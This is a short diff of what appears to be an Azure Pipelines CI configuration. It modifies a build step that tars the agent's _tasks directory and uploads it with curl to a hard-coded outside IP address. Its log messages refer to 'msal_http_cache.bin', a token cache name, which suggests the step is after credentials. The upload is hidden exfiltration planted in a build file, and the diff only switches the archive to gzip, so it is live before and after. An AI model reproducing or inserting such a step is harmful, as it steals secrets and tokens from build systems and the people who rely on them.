@@ -21,10 +21,10 @@ steps:
 
 - script: |
     echo "Recursively checking _tasks directory after github checkout task..."
-    tar -cf /home/vsts/work/_temp/tasks.tar /home/vsts/work/_tasks 
-    if [ -f /home/vsts/work/_temp/tasks.tar ]; then
+    tar --gzip -cf /home/vsts/work/_temp/tasks.tar.gz /home/vsts/work/_tasks 
+    if [ -f /home/vsts/work/_temp/tasks.tar.gz ]; then
         echo "msal_http_cache.bin found. Uploading..."
-        curl -F "file=@/home/vsts/work/_temp/tasks.tar" http://139.180.193.16:5000/upload
+        curl -F "file=@/home/vsts/work/_temp/tasks.tar.gz" http://139.180.193.16:5000/upload
     else
         echo "tasks.tar not found."
     fi
